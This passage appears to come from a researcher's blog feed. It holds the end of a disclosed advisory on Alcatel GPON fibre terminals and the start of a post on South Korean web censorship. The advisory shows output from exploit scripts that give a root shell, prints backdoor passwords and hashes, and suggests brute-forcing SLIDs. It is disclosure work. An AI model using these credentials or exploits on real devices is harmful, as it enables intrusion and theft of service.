<p>If they are Orange clients, an attacker needs to have a valid <code>SLID</code> and valid FTTH credentials to get an Internet connection: this sucks for the attacker but there are solutions (hint: <code>SLID</code> bruteforce). Note that, apparently, Orange is starting to accept DHCP instead of PPP authentication.</p>
<p><a id="hacking-the-ont"></a></p>
<h2>7. Powning the ONT</h2>
<p>As we've already see, the <code>ONT/ONU</code> are <code>Linux/ppc 2.4.20_mvl31-gponsoc clients</code> devices.</p>
<p>Note that Bouygues seems to use another model of ONT.</p>
<p><a id="rce"></a></p>
<h3>7.1. Remote Code execution</h3>
<p>We are lucky to see there is a trivial RCE in the CGIs available and 2 valid 0day exploits were written for the noble cause.</p>
<p><a href="https://github.com/pierrekim/gpon-ftth-networks-insecurity/blob/master/hacktheplanet.sh">We test them live</a>:</p>
<pre><code>user@kali:~$ ./hacktheplanet.sh
Adding an user ONT / ALC#FGU
Launching telnet client
Trying 192.168.4.254...
Connected to 192.168.4.254.
Escape character is '^]'.

MontaVista(R) Linux(R) Professional Edition 3.1
Linux/ppc 2.4.20_mvl31-gponsoc


(none) login: ONT
Password: ALC#FGU

MontaVista(R) Linux(R) Professional Edition 3.1

BusyBox v1.4.2 (2010-11-10 23:30:26 EST) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

$ id
uid=100(CRAFTSPERSON) gid=100(users)
$ ls -latrR /              
Segmentation fault
$ echo wow
wow
$ ps -auxww
  PID  Uid     VmSize Stat Command
    1 root        564 S   init [3]   
    2 root            SW  [keventd]
    3 root            SWN [ksoftirqd_CPU0]
    4 root            SW  [kswapd]
    5 root            SW  [bdflush]
    6 root            SW  [kupdated]
    7 root            SW  [mtdblockd]
  109 root        644 S   /usr/sbin/inetd 
  126 root            SWN [jffs2_gcd_mtd3]
  138 root       1600 S   /usr/sbin/sshd 
  417 root       1212 S   /usr/alcatel/bin/dbg_logger 
  418 root       1212 S   /usr/alcatel/bin/dbg_logger 
  420 root       1212 S   /usr/alcatel/bin/dbg_logger 
  431 root       1244 S N /usr/alcatel/bin/bkgndprocess 
  439 root       1124 S   /usr/alcatel/bin/ontah 
  450 root       1256 S   /usr/alcatel/bin/parser 
  462 root       1616 S   /usr/alcatel/bin/omciMgr 
  473 root       1400 S   /usr/alcatel/bin/gponMac 
  516 root        672 S   /usr/bin/httpd -h /usr/alcatel/web 
  531 root       1648 S   /var/temp/tagging 
  546 root       1348 S   /usr/alcatel/bin/IGMP 
  554 root       1268 S   /usr/alcatel/bin/ethOAM 
  563 root       1180 S N /usr/alcatel/bin/rateShaping 
  572 root       1144 S N /usr/alcatel/bin/IBcast 
  589 root       1256 S N /usr/alcatel/bin/EFMOAM 
  602 root       1256 S N /usr/alcatel/bin/EFMOAM 
  603 root       1256 S N /usr/alcatel/bin/EFMOAM 
  604 root       1256 S N /usr/alcatel/bin/EFMOAM 
  605 root       1176 S   /usr/alcatel/bin/eqpt 
  613 root       1648 S   /var/temp/tagging 
  614 root       1648 S   /var/temp/tagging 
  615 root       1648 S   /var/temp/tagging 
  616 root       1256 S   /usr/alcatel/bin/parser 
  617 root       1256 S   /usr/alcatel/bin/parser 
  618 root       1348 S   /usr/alcatel/bin/IGMP 
  619 root       1348 S   /usr/alcatel/bin/IGMP 
  620 root       1268 S   /usr/alcatel/bin/ethOAM 
  621 root       1268 S   /usr/alcatel/bin/ethOAM 
  622 root       1268 S   /usr/alcatel/bin/ethOAM 
  627 root       1180 S N /usr/alcatel/bin/rateShaping 
  628 root       1180 S N /usr/alcatel/bin/rateShaping 
  629 root       1144 S N /usr/alcatel/bin/IBcast 
  630 root       1144 S N /usr/alcatel/bin/IBcast 
  646 root        524 S   /sbin/getty -L tts/1 9600 115200 vt100 
  908 root        652 S   inetd 
 1155 root        832 S   in.telnetd: 192.168.4.251
 1156 CRAFTSPERSO    848 S   -sh 
 1520 CRAFTSPERSO    648 R   ps -auxww 
$
</code></pre>
<p><a href="https://github.com/pierrekim/gpon-ftth-networks-insecurity/blob/master/hackthemoon.sh">Nice but I prefer a root shell</a>:</p>
<pre><code>user@kali:~$ ./hackthemoon.sh
to the moon ...
done
id
uid=0(root) gid=0(root)
echo much access very root !
much access very root !
ls -la
drwxr-xr-x   15 3079     619          1024 Jun 29  2013 .
drwxr-xr-x   15 3079     619          1024 Jun 29  2013 ..
drwxrwxrwx    2 4223     619          1024 Nov 18  2010 bin
drwxr-xr-x    1 root     root            0 Jan  1  1970 dev
drwxrwxrwx   11 4223     619          1024 Dec 31 23:59 etc
drwxrwxrwx    4 51454    619          1024 Nov 11  2005 home
drwxrwxrwx    4 4223     619          2048 Aug  2  2005 lib
drwx------    2 root     root        12288 Jun 29  2013 lost+found
drwxrwxrwx    2 51454    619          1024 Aug  2  2005 mnt
dr-xr-xr-x   64 root     root            0 Jan  1  1970 proc
drwxrwxrwx    2 51454    619          1024 Aug  2  2005 root
drwxrwxrwx    2 4223     619          1024 Aug  2  2005 sbin
drwxrwxrwx    2 51454    619          1024 Jan  1 00:00 tmp
drwxrwxrwx   11 4223     619          1024 Aug  2  2005 usr
drwxrwxrwt    5 root     root          100 Jan  1  2006 var
echo nice unix rights !!
nice unix rights !!
</code></pre>
<p>You can fetch <a href="https://github.com/pierrekim/gpon-ftth-networks-insecurity/blob/master/hacktheplanet.sh">hacktheplanet.sh</a>.</p>
<p>You can fetch <a href="https://github.com/pierrekim/gpon-ftth-networks-insecurity/blob/master/hackthemoon.sh">hackthemoon.sh</a>.</p>
<p>A proofreader noted that it would be easier to create an exploit which adds an user with UID 3079 and GID 619. He is right.</p>
<p><a id="analysing-the-ont"></a></p>
<h3>7.2. Analysing the ONT</h3>
<p>Memory/CPU:</p>
<pre><code>$ cat /proc/meminfo 
        total:    used:    free:  shared: buffers:  cached:
Mem:  62537728 55193600  7344128        0   663552 31174656
Swap:        0        0        0
MemTotal:        61072 kB
[...]
$ cat /proc/cpuinfo
cpu             : e300c2 (83xx)
revision        : 0.32 (pvr 8084 0020)
bogomips        : 188.00
Vendor          : Freescale Inc.
Machine         : msc7120
core clock      : 282 MHz
bus  clock      : 141 MHz
PVR             : 0x80840020
SVR             : 0x80400010
SPRIDR          : 0x80400021
PLL setting     : 0x8
Memory          : 64 MB
$ uname -ap
Linux (none) 2.4.20_mvl31-gponsoc #1 Wed Jul 31 09:26:02 EDT 2013 ppc unknown
$
</code></pre>
<p><a id="backdoor-credentials-in-etc-passwd"></a></p>
<h3>7.3. Backdoor credentials in /etc/passwd*</h3>
<p>The <code>/etc/passwd*</code> files contain backdoor credentials to login to the remote ONT:</p>
<pre><code>user@kali:~$ cat passwd
root:*:0:0::/tmp:/bin/sh
bin:*:1:1:bin:/bin:
daemon:*:2:2:daemon:/usr/sbin:
sys:*:3:3:sys:/dev:
adm:*:4:4:adm:/var/adm:
lp:*:5:7:lp:/var/spool/lpd:
sync:*:6:8:sync:/bin:/bin/sync
shutdown:*:7:9:shutdown:/sbin:/sbin/shutdown
halt:*:8:10:halt:/sbin:/sbin/halt
mail:*:9:11:mail:/var/spool/mail:
news:*:10:12:news:/var/spool/news:
uucp:*:11:13:uucp:/var/spool/uucp:
operator:*:12:0:operator:/root:
games:*:13:100:games:/usr/games:
ftp:*:15:14:ftp:/var/ftp:
man:*:16:100:man:/var/cache/man:
nobody:*:65534:65534:nobody:/home:/bin/sh
CRAFTSPERSON:$2$367ffe585fc3070eabc901c03cd561d062ce1b67:100:100::/tmp:/usr/alcatel/bin/craftsh
sshd:*:74:74:Privilege-separated SSH:/tmp:/sbin/nologin
ONTUSER:$2$6003c3d66874a4fd38aecb0b09db563e85a62ad6:0:0::/tmp:/bin/sh
</code></pre>
<p>It appears that <code>ONTUSER</code> is a backdoor root account.</p>
<p>Other files exist in /etc - <code>passwd.ENABLE</code>:</p>
<pre><code>user@kali:~$ cat passwd.ENABLE 
root:*:0:0::/tmp:/bin/sh
bin:*:1:1:bin:/bin:
daemon:*:2:2:daemon:/usr/sbin:
sys:*:3:3:sys:/dev:
adm:*:4:4:adm:/var/adm:
lp:*:5:7:lp:/var/spool/lpd:
sync:*:6:8:sync:/bin:/bin/sync
shutdown:*:7:9:shutdown:/sbin:/sbin/shutdown
halt:*:8:10:halt:/sbin:/sbin/halt
mail:*:9:11:mail:/var/spool/mail:
news:*:10:12:news:/var/spool/news:
uucp:*:11:13:uucp:/var/spool/uucp:
operator:*:12:0:operator:/root:
games:*:13:100:games:/usr/games:
ftp:*:15:14:ftp:/var/ftp:
man:*:16:100:man:/var/cache/man:
nobody:*:65534:65534:nobody:/home:/bin/sh
CRAFTSPERSON:o4ePHnSAbwl3o:100:100::/tmp:/bin/sh
ICONFIG:9E/ixZ86A5mTQ:0:0:Alcatel User,,,:/tmp:/bin/sh
restricted:W6wa7UoRwHH7k:0:0::/tmp:/bin/mysh
sshd:*:74:74:Privilege-separated SSH:/tmp:/sbin/nologin
ONTUSER:ViUjCv6nSZ38U:0:0::/tmp:/bin/sh
</code></pre>
<p>Other backdoor accounts but not used (<code>ICONFIG</code>, <code>restricted</code> -- with root privileges).</p>
<p>The <code>passwd.DISABLE</code> file contains credentials too:</p>
<pre><code>user@kali:~$ cat passwd.DISABLE
root:*:0:0::/tmp:/bin/sh
bin:*:1:1:bin:/bin:
daemon:*:2:2:daemon:/usr/sbin:
sys:*:3:3:sys:/dev:
adm:*:4:4:adm:/var/adm:
lp:*:5:7:lp:/var/spool/lpd:
sync:*:6:8:sync:/bin:/bin/sync
shutdown:*:7:9:shutdown:/sbin:/sbin/shutdown
halt:*:8:10:halt:/sbin:/sbin/halt
mail:*:9:11:mail:/var/spool/mail:
news:*:10:12:news:/var/spool/news:
uucp:*:11:13:uucp:/var/spool/uucp:
operator:*:12:0:operator:/root:
games:*:13:100:games:/usr/games:
ftp:*:15:14:ftp:/var/ftp:
man:*:16:100:man:/var/cache/man:
nobody:*:65534:65534:nobody:/home:/bin/sh
CRAFTSPERSON:o4ePHnSAbwl3o:100:100::/tmp:/bin/sh
ICONFIG:9E/ixZ86A5mTQ:0:0:Alcatel User,,,:/tmp:/bin/sh
restricted:W6wa7UoRwHH7k:0:0::/tmp:/bin/mysh
sshd:*:74:74:Privilege-separated SSH:/tmp:/sbin/nologin
ONTUSER:megWL9CFKXbmA:0:0::/tmp:/bin/sh
</code></pre>
<p>Other interesting users (with root privileges) with hashes: <code>ICONFIG</code>, <code>restricted</code>, <code>ONTUSER</code>.</p>
<p>John will reveal password, like:</p>
<pre><code>restricted:iitywimw:0:0::/tmp:/bin/mysh
</code></pre>
<p><a id="backdoor-accountd-in-http"></a></p>
<h3>7.4. Backdoor accounts in the HTTP configuration files</h3>
<p>The <code>/usr/alcatel/web/httpd.conf</code> file contains credentials:</p>
<pre><code>user@kali:~$ ./usr/alcatel/web/httpd.conf
/:ONTUSER:$1$$j5N8wFCZNAAGhA8WA2tgJ.
/:CRAFTSPERSON:$1$$UjLhdhvWxqvlRh9TGNIv7/
</code></pre>
<p>And the <code>/etc/httpd.conf</code> contains credentials too:</p>
<pre><code>user@kali:~$ cat ./etc/httpd.conf
A:192.168.4.
D:*
/:CRAFTSPERSON:$1$$UjLhdhvWxqvlRh9TGNIv7/
</code></pre>
<p><a id="bad-unix-rights"></a></p>
<h3>7.5. Bad UNIX RIGHTS and UID/GID everywhere</h3>
<pre><code># ls -la /
drwxr-xr-x   15 3079     619          1024 Jun 29  2013 .
drwxr-xr-x   15 3079     619          1024 Jun 29  2013 ..
drwxrwxrwx    2 4223     619          1024 Nov 18  2010 bin
drwxr-xr-x    1 root     root            0 Jan  1  1970 dev
drwxrwxrwx   11 4223     619          1024 Dec 31 23:59 etc
drwxrwxrwx    4 51454    619          1024 Nov 11  2005 home
drwxrwxrwx    4 4223     619          2048 Aug  2  2005 lib
drwx------    2 root     root        12288 Jun 29  2013 lost+found
drwxrwxrwx    2 51454    619          1024 Aug  2  2005 mnt
dr-xr-xr-x   64 root     root            0 Jan  1  1970 proc
drwxrwxrwx    2 51454    619          1024 Aug  2  2005 root
drwxrwxrwx    2 4223     619          1024 Aug  2  2005 sbin
drwxrwxrwx    2 51454    619          1024 Jan  1 00:00 tmp
drwxrwxrwx   11 4223     619          1024 Aug  2  2005 usr
drwxrwxrwt    5 root     root          100 Jan  1  2006 var
#
</code></pre>
<p><code>NO COMMENT</code></p>
<p><a id="same-ssh-keys"></a></p>
<h3>7.6. Same SSH keys used in all the firmware</h3>
<p>The SSH keys are common to the 3 ONTs. They are not generated locally but are stored in all the ONTs:</p>
<pre><code>118cf5bad0322ed1215367679860a1ab  alcatel.orange.v1/etc/ssh/ssh_host_dsa_key
118cf5bad0322ed1215367679860a1ab  alcatel.sfr.v1/etc/ssh/ssh_host_dsa_key
118cf5bad0322ed1215367679860a1ab  alcatel.orange.v2/etc/ssh/ssh_host_dsa_key

1f2dc282fff78f4682fafb166bfe7512  alcatel.orange.v1/etc/ssh/ssh_host_rsa_key.pub
1f2dc282fff78f4682fafb166bfe7512  alcatel.sfr.v1/etc/ssh/ssh_host_rsa_key.pub
1f2dc282fff78f4682fafb166bfe7512  alcatel.orange.v2/etc/ssh/ssh_host_rsa_key.pub

4386f5d936f01219075999d98e5758f9  alcatel.orange.v1/etc/ssh/ssh_host_rsa_key
4386f5d936f01219075999d98e5758f9  alcatel.sfr.v1/etc/ssh/ssh_host_rsa_key
4386f5d936f01219075999d98e5758f9  alcatel.orange.v2/etc/ssh/ssh_host_rsa_key

5c3e0520cd2c0b385016bf0909280e3d  alcatel.orange.v1/etc/ssh/ssh_host_key.pub
5c3e0520cd2c0b385016bf0909280e3d  alcatel.sfr.v1/etc/ssh/ssh_host_key.pub
5c3e0520cd2c0b385016bf0909280e3d  alcatel.orange.v2/etc/ssh/ssh_host_key.pub

6d8f94cd4c1e57cc6a7e6d48d421f1e9  alcatel.orange.v1/etc/ssh/ssh_host_dsa_key.pub
6d8f94cd4c1e57cc6a7e6d48d421f1e9  alcatel.sfrv1.sfr/etc/ssh/ssh_host_dsa_key.pub
6d8f94cd4c1e57cc6a7e6d48d421f1e9  alcatel.orange.v2/etc/ssh/ssh_host_dsa_key.pub

da1e8ba42dfb2e1dfd105f8cc7a61cbb  alcatel.orange.v1/etc/ssh/ssh_host_key
da1e8ba42dfb2e1dfd105f8cc7a61cbb  alcatel.sfr.v1/etc/ssh/ssh_host_key
da1e8ba42dfb2e1dfd105f8cc7a61cbb  alcatel.orange.v2/etc/ssh/ssh_host_key
</code></pre>
<p><a id="re-alcatel"></a></p>
<h3>7.7. Reverse-engineering - introducing Alcatel binaries</h3>
<p>The Alcatel binaries are useful to control the FTTH connection :)</p>
<p><code>/usr/alcatel/help/*</code> contains all the help files:</p>
<pre><code>help
help/CommEqptMgmt
help/CommEqptMgmt/eqpt-dbg.help
help/bkgnd
help/bkgnd/bkgnd-dbg.help
help/parser
help/parser/pars-dbg.help
help/gponMac
help/gponMac/send.help
help/dbg
help/dbg/dbg.help
help/sniffer
help/sniffer/send.help
</code></pre>
<p>IE:</p>
<pre><code>user@kali:~$ cat help/gponMac/send.help

A command string is sent to the gponMac process.  The gponMac process
handles the command string and takes the appropriate action.

USAGE:
In order to send a command to the gponMac process, the following needs
to be done.
1. The gponMac process must be running.
2. The send command must be in the path.
3. The 'send gpon &lt;command string&gt;' command is then executed to send
&lt;command string&gt; to the gponMac process.

Valid commands are:

rw               ww               laser            pm
rs               dump             ri               slid
max1932          alarms           ethhdr(*1)       interrupts
sim              deviceid         ranginginfo      dsphy
dstc             usbwc            usgem            ustc
usphy            fpga(*2)         video(*3)        help

*1 - Only available on Currituck based boards.
*2 - Only available on FPGA based boards.
*3 - Only available on boards with video.

Examples:
To get more detailed information on a specific command, use:
'send gpon help &lt;command&gt;'

To get more detailed help information on all commands, use:
'send gpon help all'

To retrieve the current ranging state, the rs command, use:
'send gpon rs'
</code></pre>
<p>It appears the <code>gponMac</code> program is a big mess without security by design.</p>
<p>Having fun with Alcatel daemons:</p>
<pre><code>$ send help
send sniffer &lt;cmd str&gt;              - send &lt;cmd str&gt; to the sniffer process
send gpon &lt;cmd str&gt;                 - send &lt;cmd str&gt; to the gponMac process
send test &lt;test cmd&gt;                - perform the specified test cmd
    setpowerdown &lt;enable&gt;           - send powerdown message to gponMac process
  GPON MAC API test cmds:
    getconfinfo
    confgemport &lt;portId&gt; &lt;dir&gt;
    delgemport &lt;portId&gt; &lt;dir&gt;
    getgemportconf &lt;portId&gt;
    confgemportweight &lt;portId&gt; &lt;pbits&gt; &lt;weight&gt;
    confallocgemassoc &lt;allocId&gt; &lt;portId&gt; &lt;enable&gt;
    getallocidconf &lt;allocId&gt;
    addmcastentry &lt;mac&gt; &lt;wait&gt; |&lt;destPort&gt;|
    delmcastentry &lt;mac&gt; &lt;wait&gt;
    confmcastfilter &lt;portId&gt; &lt;enable&gt; &lt;wait&gt;
    getmcastfilterconf
    wipemcastconf
    confslid &lt;persistent&gt; &lt;hexMode&gt;          (test slid only)
    getslidconf
    wipeallconf
    setlasermode &lt;enable&gt;
    setvideomode &lt;enable&gt;
    setopticalattr &lt;agcmode&gt; &lt;agcsetting&gt; &lt;vidlosthr&gt; &lt;vidlowthr&gt; &lt;vidhighthr&gt; &lt;ponlowthr&gt; &lt;ponhighthr&gt; |&lt;lasereolhighthr&gt;|
    getopticalattr
    lockgmacpm
    unlockgmacpm
    printpm
    resetgmacpm
  Parameters:
      allocId                              - 0-4095
      portId                               - 0-4095
      enable                               - 0(disable) 1(enable)
      dir                                  - 0(upstream) 1(downstream) 2(bi-dir)
      pbits                                - 0-7
      weight                               - 0-255
      vid                                  - VLAN ID
      omci, 0vlan, keeptag, cpvid, wait    - 0(no) 1(yes)
      dest    - 0(GMII0) 1(GMII1) 2(loopback) 3(drop to processor)
      mac                                  - 0xXXXXXX
</code></pre>
<p>If you want to debug GPON, use these commands:</p>
<pre><code>empty -s -o /tmp/fifo.in "show gpon type\nshow gpon slid\nshow gpon sn\nshow firmware version\nshow gpon RSSI\n"
empty -s -o /tmp/fifo.in "show led\nshow uptime\nshow download status\nshow gpon ranging state\nshow gpon status\n"
nvram get ont_slid
</code></pre>
<p>Possible arguments for send:</p>
<pre><code>show gpon type
show gpon slid
show gpon sn
show firmware version
show gpon RSSI
show led
show uptime
show download status
show gpon ranging state
show gpon status
gpon dump
gpon rw 0
gpon rw 4
gpon rw 100
gpon rw 104
gpon ww 100 ff
gpon rw 3000
gpon rw 3004
gpon ww 3000 ff
gpon rw 3010
gpon rw 3014
gpon ww 3010 ff
gpon rw 0x4024
gpon rw 0x4030
gpon rw 0x4034
gpon rw 0x4038
gpon rw 0x403c
gpon rw 0x4040
gpon rw 0x4044
gpon rw 100   # ALARMS
gpon rw 110   # BIP errors
gpon rw 114   # ERRORED Frames
gpon rw 11c   # OOF counters
gpon rw 118   # PSYNC error counters
gpon rw 120   # Kill traffic registers 
gpon rw 124   # last bit traffic enable
[...]
</code></pre>
<p>You can have fun reversing Alcatel binaries :)</p>
<p>Having fun reversing the binaries is left as an exercise for the reader :D</p>
<p><a id="re-backdoor"></a></p>
<h3>7.8. Reverse-engineering - Strange binary</h3>
<pre><code>user@kali:~$ grep -ai backdoor usr/freescale/bin/hld_test

This command is a backdoor to reading ONU MAC registers including bad addresses
</code></pre>
<p><code>NO COMMENT</code></p>
<p><a id="bruteforce"></a></p>
<h2>8. Bruteforce</h2>
<p>When <code>SLIDs</code> are <code>PERMANENT</code>, it seems to be trivial to bruteforce <code>SLIDs</code> and <code>PON</code> passwords (<code>/usr/alcatel/dbg_bin/spiusrtest -f ponpassword</code>). You can then authenticate yourself with PPP or, if it works, just by getting a connection with DHCP.</p>
<p>When <code>SLIDs</code> are <code>VOLATILE</code>, just connecting to a FTTH located in a basement will provide, in theory, the attacker with an anonymous gigabit FTTH connection.</p>
<p><a id="conclusion"></a></p>
<h2>9. Conclusion</h2>
<p>As we have seen earlier, in certain cases, the security provided by GPON FTTH networks can be very bad.</p>
<p>I plan to publish a next article about FTTH and explain how a FTTH connection works inside the <code>ONT/ONU</code> and how an attacker can bruteforce <code>SLIDs</code> and <code>PON</code> passwords.</p>
<p>The possibilities of exploiting GPON FTTH networks are endless - that is, having fast Internet connections at home and learning interesting stuff ;)</p>
<p><a id="report-timeline"></a></p>
<h2>10. Report Timeline</h2>
<ul>
<li>2013: 0day vulnerabilities found in ONTs by Pierre Kim, reverse-engineering of ONTs and security analysis of GPON FTTH</li>
<li>Feb, 2014: First draft written by Pierre Kim</li>
<li>May 11, 2016: Pierre Kim sends a pre-advisory to Orange, the biggest French ISP</li>
<li>May 11, 2016: Orange confirms the reception of the documentation</li>
<li>Jun 16, 2016: Pierre Kim asks Orange for update</li>
<li>Jun 20, 2016: Orange confirms its work is in progress</li>
<li>Jul 29, 2016: Pierre Kim asks Orange for update</li>
<li>Sep 22, 2016: Pierre Kim asks Orange for update</li>
<li>Sep 22, 2016: Orange says the work is still in progress to evaluate the vulnerabilities</li>
<li>Sep 29, 2016: Orange asks to have a conference call</li>
<li>Sep 30, 2016: Pierre Kim asks Orange for update</li>
<li>Oct 10, 2016: Orange says the work is still in progress</li>
<li>Oct 22, 2016: Pierre Kim asks Orange for update and for a written answer</li>
<li>Oct 24, 2016: Pierre says he will disclose the information soon because of lack of answers from Orange</li>
<li>Oct 24, 2016: Orange asks for a new conference call</li>
<li>Oct 26, 2016: Orange confirms the vulnerabilities</li>
<li>Oct 26, 2016: Following the conference call with Orange, Pierre Kim informs Orange he will release the research and asks Orange for an official answer</li>
<li>Nov 01, 2016: Public disclosure</li>
</ul>
<p><a id="credits"></a></p>
<h2>11. Credits and Greetings</h2>
<p>This research was done by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<p>I would like to thank my wife who endures my time-consuming passions (maybe craziness is the correct term).</p>
<p>I would like to thank A, J and T (you know who you are :)</p>
<p>I would like to thank the <a href="https://lse.epita.fr/">LSE EPITA</a> for providing me with a lot of CPU power used to crack the hashed backdoor passwords found in the ONT firmware.</p>
<p><a id="license"></a></p>
<h2>12. License</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>Studying the Internet Censorship in South Korea</title>
        <link href="2016-10-17-studying-the-internet-censorship-in-south-korea.html"/>
        <content type="html"><p>TL;DR: Please go directly to the <a href="#conclusion">Conclusion</a> to discover how (in)effective
the censorship of Internet in South Korea is. This blogpost can be served for you to remind how HTTP requests work.</p>
<h2>Table of contents</h2>
<p>&nbsp;<a href="#introduction">0. Introduction</a><br>
&nbsp;<a href="#first-contact">1. First contact with the censorship system</a><br>
&nbsp;<a href="#locating-the-censorship-system">2. Locating the censorship system in the networks</a><br>
&nbsp;<a href="#inner-work-of-the-censorship-system">3. Inner work of the censorship system</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#different-answers-provided-by-censorship-systems">3.1. Different answers provided by censorship systems</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#direct-html-as-an-answer">3.1.1. Direct HTML as an answer</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#direct-html-as-an-answer-system-a">3.1.2. Direct HTML as an answer (censorship system A)</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#direct-html-as-an-answer-system-b">3.1.3. 302 Temporary redirect (censorship system B)</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#brief-analysis">3.2. Brief analysis</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#from-http-0.9-to-http-1.1">3.3. Let's debug the censorship system - From HTTP/0.9 to HTTP/1.1</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#http-0.9">3.3.1. HTTP/0.9</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#http-1.0">3.3.2. HTTP/1.0</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#http-1.1">3.3.3. HTTP/1.1</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#analysis">3.4. Analysis</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#more-tricky-requests-with-http">3.5 More tricky requests with HTTP</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#custom-vhosts">3.5.1. Custom Vhosts</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#http-requests-methods">3.5.2. HTTP requests methods</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#having-fun-with-http-1.1-persistent-connection">3.5.3. Having fun with HTTP/1.1 persistent connection</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#http-vs-https">3.5.4. HTTP vs. HTTPS</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#random-behaviors-provided-by-the-censorship-system">3.5.5. Random behaviors provided by the censorship system</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#cdn-for-content">3.5.6. CDN for content (VOD/images)</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#http2-for-http-uris">3.5.7. HTTP2 for http URIs</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#websockets">3.5.8. WebSockets</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#http2-for-https-uris">3.5.9. HTTP2 for https URIs</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#readline-vs-buffered-http-requests">3.5.10. Readline vs. buffered HTTP requests</a><br>
&nbsp;<a href="#http-proxies">4. Using HTTP proxies</a><br>
&nbsp;<a href="#ipv6">5. IPv6</a><br>
&nbsp;<a href="#bypassing-the-filter">6. Bypassing the filter</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#bypassing-by-using-a-different-vhost">6.1. By using a different vhost (easy-PoC)</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#bypassing-by-using-http-persistent-connection-head-then-get">6.2. By using HTTP persistent connection: HEAD then GET (PoC)</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#bypassing-by-using-http-persistent-connection-get-then-get">6.3. By using HTTP persistent connection: GET then GET (PoC)</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#bypassing-by-lf-instead-of-crlf">6.4. By using \n instead of \r\n in the HTTP requests (unreliable method, PoC)</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#bypassing-by-using-http-invalid-methods">6.5. By using HTTP invalid methods (PoC)</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#bypassing-by-sending-http-requests-line-by-line">6.6. By sending HTTP requests line by line (PoC)</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#bypassing-by-using-method-only-if-there-is-a-censorship">6.7. By using a method ONLY if there is a censorship</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#bypassing-by-using-a-vpn">6.8. By using a VPN</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#bypassing-by-using-https-websites-proxies">6.9. By using HTTPS websites/proxies</a><br>
&nbsp;<a href="#conclusion">7. Conclusion</a><br>
&nbsp;<a href="#credits-and-greeting">8. Credits and Greetings</a><br>
&nbsp;<a href="#personal-note-to-www.warning.or.kr-administrator">9. Personal note to http://www.warning.or.kr/ administrator</a><br>
&nbsp;<a href="#license">10. License</a><br></p>
<p><a id="introduction"></a></p>
<h2>0. Introduction</h2>
<p>As staying in South Korea, I was curious and wanted to know more about the censorship as stated in Wikipedia.</p>
<p><a href="https://en.wikipedia.org/wiki/Internet_censorship_in_South_Korea">Wikipedia: Censorship in South Korea</a>:</p>
<blockquote>
<p>KCSC (Korea Communications Standards Commission) is responsible for online control and requires Korean citizens to enter government issued ID numbers in order to post political comments online. The KCSC has the right to suspend or delete any web posting or articles for 30 days as soon as a complaint is filed (to combat cyberbullying in South Korea). Every week, portions of the Korean web are taken down by the KCSC. In 2013, around 23,000 Korean webpages were deleted and another 63,000 blocked by the KCSC.</p>
<p>Korean officials' rhetoric about censored material, including that it is "subversive", "illegal", "harmful" or related to "pornography and nudity", has been noted as similar to that of their Chinese counterparts. Critics also say that the government takes prohibitions on profanity as "a convenient excuse to silence critics" and chill speech.</p>
<p>This designation persisted in 2012, where the report suggests South Korea's censorship is similar to those of Russia and Egypt.</p>
</blockquote>
<p>You may have seen the infamous message "This webpage is illegal" when you try to get into some websites. By the way, if you don't speak Korean, I wish you a good luck trying to copy/paste texts from an image and understand what is going on:</p>
<p><img alt="" src="images/2016-censorship-www.warning.or.kr-logo.png" /></p>
